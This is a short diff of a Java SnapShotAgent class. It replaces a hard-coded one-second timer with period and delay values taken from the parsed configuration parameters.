@@ -33,9 +33,7 @@ public class SnapShotAgent extends Agent {
         // #ifdef DBC
         Check.asserts(Log.convertTypeLog(this.agentId) == LogType.SNAPSHOT,
                 "Wrong Conversion");
-        // #endif
-
-        setEvery(1000);
+        // #endif       
     }
 
     protected SnapShotAgent(boolean agentStatus, byte[] confParams) {
@@ -140,6 +138,9 @@ public class SnapShotAgent extends Agent {
             debug.error("params FAILED");
             return false;
         }
+        
+        setPeriod(timerMillis);
+        setDelay(timerMillis);
 
         return true;
     }
